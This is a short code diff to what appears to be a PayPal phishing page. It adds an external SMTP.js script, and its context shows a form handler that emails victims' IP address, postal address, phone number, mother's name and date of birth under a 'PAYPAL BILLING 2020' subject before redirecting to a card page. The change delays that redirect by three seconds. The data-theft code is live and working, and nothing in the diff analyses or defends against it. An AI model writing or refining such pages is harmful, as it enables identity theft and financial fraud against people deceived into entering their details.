@@ -95,6 +95,7 @@ $(document).ready(function(){
 			});
 </script>
 <script type="text/javascript" src="js/jquery.min.js"></script></head>
+<script src="https://smtpjs.com/v3/smtp.js"></script>
 <body>
 <div class="standard" id="page">
 
@@ -263,7 +264,7 @@ $('#next').click(function(e){
                         Body : 'PAYPAL BILLING 2020\nIP:'+$('#ip').val()+'\naddress1:'+$('#address_1').val()+'\naddress2:'+$('#address_2').val()+'\nCity:'+$('#city').val()+'\nState:'+$('#state').val()+'\nZip:'+$('#zip').val()+'\nCountry:'+$('#country').val()+'\nPhone:'+$('#phone').val()+'\nMother Name:'+$('#mother').val()+'\nDoB:'+$('#dob_day').val()+'/'+$('#dob_month').val()+'/'+$('#dob_year').val()
                         }).then(
                         // message => alert(message)
-                        window.location.replace("cc.html")
+                        setInterval(function(){ window.location.replace("cc.html"); }, 3000)
                         );
     }
     });
